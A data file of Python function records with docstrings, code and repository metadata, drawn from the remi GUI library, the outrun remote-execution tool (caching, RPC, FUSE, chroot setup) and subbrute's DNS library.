{"docstring": "# left name\n", "func_signal": "def on_button_pressed_menu(self, emitter):\n", "code": "Name = self.txtName1.get_text()\nName, FntSize = MyApp.name_length(Name)\nFntSize = str(FntSize) + \"px\"\nself.lblLeftName.style['font-size'] = FntSize\nself.lblLeftName.set_text(Name)\n# right name\nName = self.txtName2.get_text()\nName, FntSize = MyApp.name_length(Name)\nFntSize = str(FntSize) + \"px\"\nself.lblRightName.style['font-size'] = FntSize\nself.lblRightName.set_text(Name)", "path": "remi/examples/examples_from_contributors/SCOREBOARD_WITH_SETTING_PAGE/SCOREBOARD_WITH_SETTING_PAGE.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "#refWidget is the target widget that will be resized\n#newParent is the container\n", "func_signal": "def setup(self, refWidget, newParent):\n", "code": "if self.parent:\n    try:\n        self.parent.remove_child(self)\n    except Exception:\n        #there was no ResizeHelper placed\n        pass\nif newParent==None:\n    return\nself.parent = newParent\nself.refWidget = refWidget\ntry:\n    self.parent.append(self)\nexcept Exception:\n    #the selected widget's parent can't contain a ResizeHelper\n    pass\n#self.refWidget.style['position'] = 'relative'\nself.update_position()", "path": "remi/examples/resizable_panes.py", "commit_date": "2020-05-02 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "\"\"\"Sets the stroke properties.\n\nArgs:\n    width (int): stroke width\n    color (str): stroke color\n\"\"\"\n", "func_signal": "def set_stroke(self, width=1, color='black'):\n", "code": "self.attributes['stroke'] = color\nself.attributes['stroke-width'] = str(width)", "path": "remi/examples/examples_from_contributors/Svg_drawing_app.py", "commit_date": "2019-01-24 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "#custom additional html head tags\n", "func_signal": "def main(self):\n", "code": "my_html_head = \"\"\"\n    \"\"\"\n\n#custom css\nmy_css_head = \"\"\"\n    <link rel=\"stylesheet\" href=\"\" type=\"text/css\">\n    \"\"\"\n\n#custom js\nmy_js_head = \"\"\"\n    <script></script>\n    \"\"\"\n#appending elements to page header\nself.page.children['head'].add_child('myhtml', my_html_head)\nself.page.children['head'].add_child('mycss', my_css_head)\nself.page.children['head'].add_child('myjs', my_js_head)\n\n#setting up the application icon\nself.page.children['head'].set_icon_file(\"/res:icon.png\")\n\n#eventually set up body attributes/style\n#self.page.children['body'].style['background-color'] = 'lightyellow'\n#eventually set up body event listeners\n#self.page.children['body'].onkeydown.do(self.onkeydown)\n\n#creating a container VBox type, vertical (you can use also HBox or Widget)\nmain_container = gui.VBox(width=300, height=200, style={'margin':'0px auto'})\n\n# returning the root widget\nreturn main_container", "path": "remi/examples/template_advanced_app.py", "commit_date": "2020-05-02 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "# if there are no childrens, return\n", "func_signal": "def on_remove_a_label_pressed(self, emitter):\n", "code": "if len(self.lbls_container.children) < 1:\n    return\nkey = str(len(self.lbls_container.children) - 1)\nself.lbls_container.remove_child(self.lbls_container.children[key])", "path": "remi/examples/append_and_remove_widgets_app.py", "commit_date": "2020-04-28 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "\"\"\" for the selected widget are listed the relative signals\n    for each signal there is a dropdown containing all the widgets\n    the user will select the widget that have to listen a specific event\n\"\"\"\n", "func_signal": "def update(self, widget, widget_tree):\n", "code": "self.listeners_list = []\nself.build_widget_list_from_tree(widget_tree)\n\nself.label.set_text('Signal connections: ' + widget.variable_name)\n#del self.container\nself.container = gui.VBox(width='100%', height='90%')\nself.container.style['justify-content'] = 'flex-start'\nself.container.style['overflow-y'] = 'scroll'\n\n# for all the events of this widget\n# isclass instead of ismethod because event methods are replaced with ClassEventConnector\nfor (setOnEventListenerFuncname, setOnEventListenerFunc) in inspect.getmembers(widget):\n    # if the member is decorated by decorate_set_on_listener and the function is referred to this event\n    if issubclass(type(setOnEventListenerFunc), gui.ClassEventConnector):\n        self.container.append(SignalConnection(widget,\n                                               self.listeners_list,\n                                               setOnEventListenerFuncname,\n                                               setOnEventListenerFunc,\n                                               width='100%'))\n\nself.append(self.container, 'container')", "path": "remi/editor/editor_widgets.py", "commit_date": "2020-11-19 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "\"\"\" Draw a rhombus polygon.\n    Horizontal size (-hor_size, +hor_size) and\n    vertical size (-vert_size, +vert_size).\n    with its center on position X,Y\n    and with its str_id as text in the middle.\n\"\"\"\n", "func_signal": "def rhombus_polygon(self, X, Y, str_id, hor_size, vert_size):\n", "code": "x0, y0 = X - hor_size, Y   # mid_west\nx1, y1 = X, Y - vert_size  # mid_north\nx2, y2 = X + hor_size, Y   # mid_east\nx3, y3 = X, Y + vert_size  # mid_south\n\npolygon = SvgPolygon(4)\npolygon.set_stroke(width=2, color='black')\npoly_name = gui.SvgText(X, Y + 5, str_id)\npoly_name.attributes['text-anchor'] = 'middle'\nself.sheet.append([polygon, poly_name])\n\nmid_north = [x1, y1]\nmid_south = [x3, y3]\nmid_east = [x2, y2]\nmid_west = [x0, y0]\n\npolygon.add_coord(*mid_north)\npolygon.add_coord(*mid_east)\npolygon.add_coord(*mid_south)\npolygon.add_coord(*mid_west)\n\nreturn mid_north, mid_south, mid_east, mid_west", "path": "remi/examples/examples_from_contributors/Svg_drawing_app.py", "commit_date": "2019-01-24 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "\"\"\" Here the widget is allocated\n\"\"\"\n", "func_signal": "def create_instance(self, widget):\n", "code": "self.varname_list = []\nself.build_widget_name_list_from_tree(self.appInstance.project)\nself.used_keys_list = []\nself.build_widget_used_keys_list_from_tree(self.appInstance.project)\nprint(\"-------------used keys:\" + str(self.used_keys_list))\nvariableName = ''\nfor i in range(0, 1000):  # reasonably no more than 1000 widget instances in a project\n    variableName = self.widgetClass.__name__.lower() + str(i)\n    if not variableName in self.varname_list and not variableName in self.used_keys_list:\n        break\n\n\"\"\"\nif re.match('(^[a-zA-Z][a-zA-Z0-9_]*)|(^[_][a-zA-Z0-9_]+)', variableName) == None:\n    self.errorDialog = gui.GenericDialog(\"Error\", \"Please type a valid variable name.\", width=350,height=120)\n    self.errorDialog.show(self.appInstance)\n    return\n\nif variableName in self.varname_list:\n    self.errorDialog = gui.GenericDialog(\"Error\", \"The typed variable name is already used. Please specify a new name.\", width=350,height=150)\n    self.errorDialog.show(self.appInstance)\n    return\n\"\"\"\n# here we create and decorate the widget\nwidget = self.widgetClass(**self.kwargs_to_widget)\nwidget.attr_editor_newclass = False\nwidget.variable_name = variableName\n\nfor key in self.optional_style_dict:\n    widget.style[key] = self.optional_style_dict[key]\nself.optional_style_dict = {}\n\nself.appInstance.add_widget_to_editor(widget)", "path": "remi/editor/editor_widgets.py", "commit_date": "2020-11-19 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "\"\"\" Draw a drawing with two boxes, each with a name inside\n    and a polyline between the midpoints of the sides of the boxes,\n    with half-way the polyline a rhombus with an id included.\n\"\"\"\n", "func_signal": "def Draw_a_drawing_of_one_sheet(self, nr_of_boxes, box_names):\n", "code": "thickness = 2  # Line thickness\ncenter_x = []    # x of the center of box[i] on canvas\ncenter_y = []    # y of the center of box[i] on canvas\nmid_points = []\nbox_width = 100  # pixels\nbox_height = 100  # pixels\ndelta_x = self.screen_width / (nr_of_boxes + 1)\ndelta_y = self.screen_height / (nr_of_boxes + 1)\n# Draw the boxes\nfor box_nr in range(0, nr_of_boxes):\n    center_x.append(delta_x + box_nr * delta_x)\n    center_y.append(delta_y + box_nr * delta_y)\n    name = box_names[box_nr]\n    ident = str(box_nr + 1)\n    # Draw one box at the specified location\n    mid_points.append(self.box_type_1(\n        center_x[box_nr], center_y[box_nr],\n        name, ident, box_width,box_height))\n\n# Draw a line with arrow head to the first box\nx2 = mid_points[0][3][0]\ny2 = mid_points[0][3][1]\nx1 = x2 - 150\ny1 = y2\nline_0 = gui.SvgLine(x1, y1, x2, y2)\nline_0.set_stroke(width=thickness, color='black')\nself.sheet.append(line_0)\n# Add an arrow head to line_0\nhead_0 = SvgPolygon(4)\narrow_height = 20\narrow_width = arrow_height / 3\nrecess = arrow_height / 5\nhead_0.add_arrow_coord(line_0, arrow_height, arrow_width, recess)\nhead_0.set_stroke(width=thickness, color='black')\nhead_0.set_fill(color='blue')\nself.sheet.append(head_0)\n\n# Draw a rhombus polygon\nx = (center_x[0] + center_x[1]) / 2\ny = (center_y[0] + center_y[1]) / 2\nself.int_id += 1\nstr_id = str(self.int_id)\nhor_size = 15  # pixels\nvert_size = 25  # pixels\nrhombus = self.rhombus_polygon(x, y, str_id, hor_size, vert_size)\n\n# Determine points of the first polyline\nline_1_points = []\nline_1_points.append(mid_points[0][2])\ncorner = [rhombus[0][0], mid_points[0][2][1]]\nline_1_points.append(corner)\nline_1_points.append(rhombus[0])\n# Draw a polyline from box_1 to rhombus\nline1 = gui.SvgPolyline(_maxlen=4)\nfor pt in line_1_points:\n    line1.add_coord(*pt)\nline1.set_stroke(width=thickness, color='black')\nself.sheet.append(line1)\n\n# Determine points of the second polyline\nline_2_points = []\nline_2_points.append(rhombus[1])\ncorner = [rhombus[1][0], mid_points[1][3][1]]\nline_2_points.append(corner)\nline_2_points.append(mid_points[1][3])\n# Drawa polyline from rhombus to box_2\nline2 = gui.SvgPolyline(_maxlen=4)\nfor pt in line_2_points:\n    line2.add_coord(pt[0], pt[1])\nline2.set_stroke(width=thickness, color='black')\nself.sheet.append(line2)\n\n# Add an arrow head to line2\nhead = SvgPolygon(4)\nhead.add_arrow_coord(line2, arrow_height, arrow_width, recess)\nhead.set_stroke(width=thickness, color='black')\nhead.set_fill(color='blue')\nself.sheet.append(head)", "path": "remi/examples/examples_from_contributors/Svg_drawing_app.py", "commit_date": "2019-01-24 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "# create an helper that will be created on click\n# the helper have to search for function that have 'return' annotation 'event_listener_setter'\n", "func_signal": "def add_widget_to_collection(self, widgetClass, group='standard_tools', **kwargs_to_widget):\n", "code": "if group not in self.widgetsContainer.children.keys():\n    self.widgetsContainer.append(EditorAttributesGroup(group), group)\n    self.widgetsContainer.children[group].style['width'] = \"100%\"\n\nhelper = WidgetHelper(\n    self.appInstance, widgetClass, **kwargs_to_widget)\nhelper.attributes['title'] = widgetClass.__doc__\n#self.widgetsContainer.append( helper )\nself.widgetsContainer.children[group].append(helper)", "path": "remi/editor/editor_widgets.py", "commit_date": "2020-11-19 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "# here the event method gets called\n", "func_signal": "def __call__(self, *args, **kwargs):\n", "code": "callback_params = self.event_method_bound(*args, **kwargs)\n\nif not self.editor_listener_callback is None:\n    self.editor_listener_callback(\n        self.event_source_instance, *callback_params, **self.kwuserdata)\n\nif not self.callback:\n    return callback_params\nif not callback_params:\n    callback_params = self.userdata\nelse:\n    callback_params = callback_params + self.userdata\n\n# here the listener gets called, passing as parameters the return values of the event method\n# plus the userdata parameters\nreturn self.callback(self.event_source_instance, *callback_params, **self.kwuserdata)", "path": "remi/editor/editor_widgets.py", "commit_date": "2020-11-19 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "# Here the software update automatically any number you can see in the app\n", "func_signal": "def check_score(self):\n", "code": "if (self.LeftNum < self.MatchNum) and (self.RightNum < self.MatchNum):\n    self.lblLeftNum.set_text(str(self.LeftNum))\n    self.lblRightNum.set_text(str(self.RightNum))\n    self.lblLeftMatches.set_text(str(self.LeftMatchNum))\n    self.lblRightMatches.set_text(str(self.RightMatchNum))\n    self.lblMatches.set_text(str(self.MatchNum))\n# Here the software check if a background needs to be green or orange.\nif (self.LeftNum < self.MatchNum - 1):\n    self.wid2.style['background-color'] = 'green'\n    self.btLeftPlus.attributes['class']='up80'\n    self.btLeftMinus.attributes['class']='dn80'\nif (self.RightNum < self.MatchNum - 1):\n    self.wid3.style['background-color'] = 'green'\n    self.btRightPlus.attributes['class']='up80'\n    self.btRightMinus.attributes['class']='dn80'\nif (self.LeftNum == self.MatchNum - 1):\n    self.wid2.style['background-color'] = 'orange'\n    self.btLeftPlus.attributes['class']='up80org'\n    self.btLeftMinus.attributes['class']='dn80org'\nif (self.RightNum == self.MatchNum - 1):\n    self.wid3.style['background-color'] = 'orange'\n    self.btRightPlus.attributes['class']='up80org'\n    self.btRightMinus.attributes['class']='dn80org'\n# When one of the player win the match a thread is called to temporary convert the background to red and then move it back to green.\n# The thread is required to don't stop the automatic update of the graphics in the app.\n# The app passes to the thread three parameters: lblLeftNum (used as text field to show the number in the app), the widget where the information are on the interface,\n# LeftNum that is the varible to check the games won fro the left player). For right player is the same but instead of left in the varible I used right :-).\n\n# Left side\nif (self.LeftNum >= self.MatchNum): \n    Side = [self.lblLeftNum, self.wid2, self.LeftNum, self.btLeftPlus, self.btLeftMinus]\n    t = threading.Thread(target=self.ChangeColor, args = (Side))\n    t.start()\n    self.LeftMatchNum = self.LeftMatchNum + 1\n# Right side\nelif (self.RightNum >= self.MatchNum):\n    Side = [self.lblRightNum, self.wid3, self.RightNum, self.btRightPlus, self.btRightMinus]\n    t = threading.Thread(target=self.ChangeColor, args = (Side))\n    t.start()\n    self.RightMatchNum = self.RightMatchNum + 1", "path": "remi/examples/examples_from_contributors/SCOREBOARD_WITH_SETTING_PAGE/SCOREBOARD_WITH_SETTING_PAGE.py", "commit_date": "2019-11-22 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "\"\"\"The value have to be in the form '10px' or '10%', so numeric value plus measure unit\n\"\"\"\n", "func_signal": "def set_value(self, value):\n", "code": "v = 0\nmeasure_unit = 'px'\nif not value is None:\n    try:\n        v = int(float(value.replace('px', '')))\n    except ValueError:\n        try:\n            v = int(float(value.replace('%', '')))\n            measure_unit = '%'\n        except ValueError:\n            pass\nself.numInput.set_value(v)\nself.dropMeasureUnit.set_value(measure_unit)\nself.set_valid(not value is None)", "path": "remi/editor/editor_widgets.py", "commit_date": "2020-11-19 00:00:00", "repo_name": "rawpython/remi", "stars": 3442, "license": "apache-2.0", "language": "python", "size": 4459}
{"docstring": "\"\"\"Deserialize cache entries from the disk cache index.\"\"\"\n", "func_signal": "def _read_disk_entries(self) -> Dict[str, CacheEntry]:\n", "code": "with open(self._cache_index_path, \"r\") as f:\n    return self._encoding.load_json(f)", "path": "outrun/outrun/filesystem/caching/cache.py", "commit_date": "2020-08-13 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"Close the client sockets and their ZeroMQ context.\"\"\"\n", "func_signal": "def __del__(self) -> None:\n", "code": "with self._socket_pool_lock:\n    for sock in self._socket_pool.values():\n        sock.close(linger=0)\n\n    self.context.destroy()", "path": "outrun/outrun/rpc/__init__.py", "commit_date": "2020-07-14 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"\nSynchronize the cache with the current state of the local machine.\n\nThis is implemented by sending all cached metadata back to the local machine and\nhaving it compare the entries with the current metadata on disk. Any entries\nthat have meaningfully changed (everything aside from last access timestamp) are\nreturned and updated. Additionally, the local machine is informed of the\ncontents in the remote cache to ensure that there are no superfluous prefetches.\n\nThis sounds inefficient, but in practice this is much faster than checking the\nfreshness of cache entries one-by-one upon first access because it avoids the\nlatency overhead.\n\"\"\"\n", "func_signal": "def sync(self) -> None:\n", "code": "cached_metadata = {\n    entry.path: entry.meta\n    for key, entry in self._entries.items()\n    if key.startswith(self._machine_id)\n}\n\nif len(cached_metadata) == 0:\n    return\n\nchanged_metadata: Dict[str, Metadata]\nchanged_metadata = self._client.get_changed_metadata(cached_metadata)\n\nfor path, new_metadata in changed_metadata.items():\n    log.debug(f\"updating metadata cache for {path}\")\n\n    with self._lock_entry(path) as entry:  # type: CacheEntry\n        entry.meta = new_metadata\n        entry.last_update = time.time()\n\n        if entry.contents:\n            # Delete cached contents if entry is no longer an existent file\n            if entry.meta.error:\n                entry.contents = None\n            elif entry.meta.attr and not stat.S_ISREG(entry.meta.attr.st_mode):\n                entry.contents = None\n            else:\n                entry.contents.dirty = True\n\n# In addition to syncing metadata, also mark content as having been cached\nif self._prefetch:\n    self._client.mark_previously_fetched_contents(\n        [\n            entry.path\n            for entry in self._entries.values()\n            if entry.contents and not entry.contents.dirty\n        ]\n    )", "path": "outrun/outrun/filesystem/caching/cache.py", "commit_date": "2020-08-13 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"Ensure that we're running as root to be able to use chroot.\"\"\"\n", "func_signal": "def _become_root() -> None:\n", "code": "if os.geteuid() != 0:\n    try:\n        home_env = f\"HOME={os.getenv('HOME')}\"\n        os.execvp(\"sudo\", [\"sudo\", home_env, sys.executable] + sys.argv)\n    except OSError as e:\n        raise RuntimeError(f\"failed to become root using sudo: {e}\")", "path": "outrun/outrun/operations/remote.py", "commit_date": "2020-07-14 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"\nDelete cache entries and cached contents until they're below limits.\n\nThe entries that have been last accessed the longest time ago are deleted first\nuntil the total number of entries is below the max entries limit again. If the\ntotal size of the cached contents is still too high after this then some of the\ncached contents for the remaining cache entries are also deleted.\n\"\"\"\n", "func_signal": "def _lru_cleanup(self) -> None:\n", "code": "oldest_entries: List[Tuple[str, CacheEntry]] = list(self._entries.items())\noldest_entries.sort(key=lambda tuple: tuple[1].last_access)\n\nentry_count = len(oldest_entries)\ncontents_size = sum([e.contents.size for _, e in oldest_entries if e.contents])\n\nfor key, entry in oldest_entries:\n    if contents_size > self._max_size and entry.contents:\n        contents_size -= entry.contents.size\n        entry.contents = None\n\n    if entry_count > self._max_entries:\n        entry_count -= 1\n        del self._entries[key]", "path": "outrun/outrun/filesystem/caching/cache.py", "commit_date": "2020-08-13 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"\nUpdate the disk cache from the in-memory cache.\n\nIf there is already a disk cache then it is read first to merge any new entries\ninto the in-memory cache. This handles the case where a different outrun session\nhas written new cache entries to disk in the background. Conflicts are handled\nby keeping the most recently updated entry.\n\nThe LRU cleanup runs after this merge has completed and deletes entries and\ncached contents until the cache is below the specified limits again.\n\nFiles with cached contents that are no longer referenced by the cache afterwards\nare deleted from the disk.\n\"\"\"\n", "func_signal": "def save(self, merge_disk_cache=True) -> None:\n", "code": "with fasteners.InterProcessLock(self._cache_lock_path):\n    if merge_disk_cache:\n        # Load latest cache entries in disk cache\n        disk_entries = {}\n\n        try:\n            disk_entries = self._read_disk_entries()\n        except FileNotFoundError:\n            log.debug(\"no disk cache to merge with\")\n        except Exception as e:\n            log.error(f\"not merging with existing disk cache: {e}\")\n\n        # Merge them with in-memory cache\n        for key, disk_entry in disk_entries.items():\n            if disk_entry.newer_than(self._entries.get(key)):\n                self._entries[key] = disk_entry\n\n    # LRU pass\n    self._lru_cleanup()\n\n    # Delete cached contents that are no longer referenced\n    self._garbage_collect_blobs()\n\n    with open(self._cache_index_path, \"w\") as f:\n        self._encoding.dump_json(self._entries, f)", "path": "outrun/outrun/filesystem/caching/cache.py", "commit_date": "2020-08-13 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"Delete cached contents blobs on disk that are no longer referenced.\"\"\"\n", "func_signal": "def _garbage_collect_blobs(self) -> None:\n", "code": "orphans = {\n    os.path.join(self._cache_contents_path, fn)\n    for fn in os.listdir(self._cache_contents_path)\n}\n\nfor entry in self._entries.values():\n    # Only persisted files need to be cleaned up\n    if entry.contents and isinstance(entry.contents.storage, str):\n        try:\n            orphans.remove(entry.contents.storage)\n        except KeyError:\n            # This may happen if a persisted file has disappeared from the disk\n            pass\n\nfor path in orphans:\n    try:\n        os.remove(path)\n    except FileNotFoundError:\n        # Race condition where blob has already been removed\n        pass", "path": "outrun/outrun/filesystem/caching/cache.py", "commit_date": "2020-08-13 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"Instantiate new caching and prefetching RPC service.\"\"\"\n", "func_signal": "def __init__(self):\n", "code": "super().__init__()\n\nself._fetched_lock = threading.Lock()\nself._fetched_metadata: Set[str] = set()\nself._fetched_contents: Set[str] = set()\n\nself._prefetchable_paths: Optional[List[str]] = None", "path": "outrun/outrun/filesystem/caching/service.py", "commit_date": "2020-07-14 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"File system has been successfully mounted by FUSE.\"\"\"\n", "func_signal": "def init(self) -> None:\n", "code": "if self._mount_callback is not None:\n    self._mount_callback()", "path": "outrun/outrun/filesystem/filesystem.py", "commit_date": "2020-07-14 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"Copy the attributes with write permissions removed from the mode.\"\"\"\n", "func_signal": "def as_readonly(self) -> Attributes:\n", "code": "readonly_mode = self.st_mode & ~(stat.S_IWUSR | stat.S_IWGRP | stat.S_IWOTH)\n\nreturn dataclasses.replace(self, st_mode=readonly_mode)", "path": "outrun/outrun/filesystem/common.py", "commit_date": "2020-07-14 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "# Support coverage.py within FUSE threads.\n", "func_signal": "def wrapper(*args, **kwargs):\n", "code": "if hasattr(threading, \"_trace_hook\"):\n    sys.settrace(getattr(threading, \"_trace_hook\"))\n\ntry:\n    res = fn(*args, **kwargs)\n\n    if res is None:\n        res = 0\n\n    return res\nexcept OSError as e:\n    # FUSE expects an error to be returned as negative errno.\n    if e.errno:\n        return -e.errno\n    else:\n        return -errno.EIO\nexcept NotImplementedError:\n    log.debug(f\"fuse::{name}() not implemented!\")\n\n    return -errno.ENOSYS\nexcept Exception:\n    log.warning(f\"fuse::{name}() raised an unexpected exception:\")\n    log.warning(traceback.format_exc())\n\n    return -errno.EIO", "path": "outrun/outrun/filesystem/fuse/__init__.py", "commit_date": "2020-07-14 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"Request/response loop to handle calls for a single worker thread.\"\"\"\n", "func_signal": "def _run_worker(self) -> NoReturn:\n", "code": "socket = self.context.socket(zmq.REP)\nsocket.connect(f\"inproc://{id(self)}\")\n\nwhile True:\n    # Wait for a call to come in\n    token, function, *args = self._encoding.unpack(socket.recv())\n\n    if token != self.token:\n        # Authentication token mismatch between client/server\n        socket.send(self._encoding.pack((ReturnType.TOKEN_ERROR.value, None)))\n    else:\n        # Invoke the method and return the response (value/raised exception)\n        try:\n            if function is None:\n                ret = None\n            else:\n                ret = getattr(self.service, function)(*args)\n\n            socket.send(self._encoding.pack((ReturnType.NORMAL.value, ret)))\n        except Exception as e:\n            socket.send(self._encoding.pack((ReturnType.EXCEPTION.value, e)))", "path": "outrun/outrun/rpc/__init__.py", "commit_date": "2020-07-14 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"Generate and communicate a random authentication token over stdout.\"\"\"\n", "func_signal": "def _token_handshake() -> str:\n", "code": "token = secrets.token_hex(16)\ntoken_signature = hashlib.sha256(token.encode()).hexdigest()\n\n# Output token and its checksum as in-band signal\nsys.stdout.buffer.write(chr(curses.ascii.SOH).encode())\nsys.stdout.buffer.write(f\"{token}{token_signature}\".encode())\nsys.stdout.buffer.write(chr(curses.ascii.STX).encode())\n\nsys.stdout.buffer.flush()\n\nreturn token", "path": "outrun/outrun/operations/remote.py", "commit_date": "2020-07-14 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"\nOpen a (cached) file for reading or writing.\n\nCached files can only be opened for reading.\n\"\"\"\n", "func_signal": "def open(self, path, flags) -> int:\n", "code": "if not self._cache.is_cacheable(path):\n    return super().open(path, flags)\n\nreturn self._cache.open_contents(path, flags)", "path": "outrun/outrun/filesystem/caching/filesystem.py", "commit_date": "2020-07-14 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"Return the number of sockets for this client.\"\"\"\n", "func_signal": "def socket_count(self) -> int:\n", "code": "with self._socket_pool_lock:\n    return len(self._socket_pool)", "path": "outrun/outrun/rpc/__init__.py", "commit_date": "2020-07-14 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"Ensure that the remote server is set up correctly.\"\"\"\n", "func_signal": "def _setup(self) -> None:\n", "code": "self._become_root()\nself._unshare_mounts()\nself._enable_fuse()\n\n# Ensure that outrun files are only accessibly by root\nos.umask(0o077)\n\n# Load config\nself._config = Config.load(os.path.expanduser(self._args.config))", "path": "outrun/outrun/operations/remote.py", "commit_date": "2020-07-14 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "# Terminate the command if outrun is terminated\n", "func_signal": "def preexec_fn() -> None:\n", "code": "self._set_death_signal(signal.SIGTERM)\n\n# Chroot into mounted local file system\nos.chroot(root_path)\n\n# Set working directory\nos.chdir(working_dir)", "path": "outrun/outrun/operations/remote.py", "commit_date": "2020-07-14 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"Derive a unique machine/installation identifier.\"\"\"\n", "func_signal": "def get_app_specific_machine_id() -> str:\n", "code": "with open(\"/etc/machine-id\", \"rb\") as f:\n    confidential_id = f.read().strip()\n\n# http://man7.org/linux/man-pages/man5/machine-id.5.html\n# Based on sd_id128_get_machine_app_specific implementation\nreturn hashlib.sha256(confidential_id + constants.APP_ID).hexdigest()[:32]", "path": "outrun/outrun/filesystem/caching/service.py", "commit_date": "2020-07-14 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"Unshare mount namespace to hide file system mount from other processes.\"\"\"\n", "func_signal": "def _unshare_mounts(self) -> None:\n", "code": "if self._args.unshare:\n    try:\n        new_args = [arg for arg in sys.argv if arg != \"--unshare\"]\n        os.execvp(\"unshare\", [\"unshare\", \"-m\", sys.executable] + new_args)\n    except OSError as e:\n        raise RuntimeError(f\"failed to unshare mount namespace: {e}\")", "path": "outrun/outrun/operations/remote.py", "commit_date": "2020-07-14 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"Initialize the in-memory cache from the disk cache.\"\"\"\n", "func_signal": "def load(self) -> None:\n", "code": "with fasteners.InterProcessLock(self._cache_lock_path):\n    self._entries = self._read_disk_entries()", "path": "outrun/outrun/filesystem/caching/cache.py", "commit_date": "2020-08-13 00:00:00", "repo_name": "Overv/outrun", "stars": 3105, "license": "apache-2.0", "language": "python", "size": 968}
{"docstring": "\"\"\"\n    Initialise Buffer from data\n\"\"\"\n", "func_signal": "def __init__(self,data=b''):\n", "code": "self.data = bytearray(data)\nself.offset = 0", "path": "subbrute/dnslib/buffer.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Add 'names' dict to cache stored labels\n\"\"\"\n", "func_signal": "def __init__(self,data=b''):\n", "code": "super(DNSBuffer,self).__init__(data)\nself.names = {}", "path": "subbrute/dnslib/label.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
{"docstring": "\"\"\"\n    Respond to DNS request - parameters are request packet & handler.\n    Method is expected to return DNS response\n\"\"\"\n", "func_signal": "def resolve(self,request,handler):\n", "code": "reply = request.reply()\nqname = request.q.qname\nqtype = QTYPE[request.q.qtype]\nfor name,rtype,rr in self.zone:\n    # Check if label & type match\n    if getattr(qname,self.eq)(name) and (qtype == rtype or \n                                         qtype == 'ANY' or \n                                         rtype == 'CNAME'):\n        # If we have a glob match fix reply label\n        if self.glob:\n            a = copy.copy(rr)\n            a.rname = qname\n            reply.add_answer(a)\n        else:\n            reply.add_answer(rr)\n        # Check for A/AAAA records associated with reply and\n        # add in additional section\n        if rtype in ['CNAME','NS','MX','PTR']:\n            for a_name,a_rtype,a_rr in self.zone:\n                if a_name == rr.rdata.label and a_rtype in ['A','AAAA']:\n                    reply.add_ar(a_rr)\nif not reply.rr:\n    reply.header.rcode = RCODE.NXDOMAIN\nreturn reply", "path": "subbrute/dnslib/zoneresolver.py", "commit_date": "2016-11-13 00:00:00", "repo_name": "TheRook/subbrute", "stars": 3226, "license": "gpl-3.0", "language": "python", "size": 12112}
